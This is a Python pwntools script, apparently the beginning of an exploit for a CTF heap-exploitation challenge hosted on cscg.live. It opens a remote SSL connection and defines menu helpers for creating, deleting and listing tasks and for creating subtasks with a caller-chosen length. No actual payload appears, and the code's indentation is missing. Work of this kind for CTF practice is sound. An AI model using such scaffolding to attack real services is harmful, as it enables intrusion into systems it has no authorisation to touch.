#!/bin/python
from pwn import remote, process, ELF,context,p64
from pwnlib import gdb
import string
import sys
context.terminal="/bin/kitty"
target=None
libc=None
CN=None
#CN = remote("172.17.0.2", 1024)
CN = remote("5776ee6f6010e76a238267e2-intro-heap-2.challenge.master.cscg.live", 31337, ssl=True)
if target is not None:
p=target.process()
if isinstance(p, process) and CN is None:
print("isproces")
CN=p
elif CN is None:
sys.exit()
PROMPT=b"choice?"
def createTask(name:str):
CN.send(b"1\n")
CN.send(name.encode('ascii')+b"\n")
response=CN.recvuntil(PROMPT)
def deleteTask(mainTaskId:int):
CN.send(b"2\n")
CN.send(str(mainTaskId).encode('ascii')+b"\n")
CN.recvuntil(PROMPT)
def listTask():
CN.send(b"3\n")
response=CN.recvuntil(PROMPT)
r1=response.split(b"---menu---")[0].split(b"\n")
tasks={}
for i in range(len(r1)-1):
pair=r1[i].split(b"] ")
tasks[int(pair[0][-2:])]=pair[1]
return tasks
def createSubTask(content, mainTaskId:int, length=None):
if length==None:
length=len(content)+1
CN.send(b"4\n")
CN.send(str(mainTaskId).encode('ascii')+b"\n")
CN.send(str(length).encode('ascii')+b"\n")
if isinstance(content,str):
contentmsg=content.encode('ascii')
elif isinstance(content, bytes):
contentmsg=content
else:
contentmsg=None
print("Wrong content type")
if contentmsg is not None:
if length!=0:
CN.send(contentmsg+b"\n")
CN.recvuntil(PROMPT)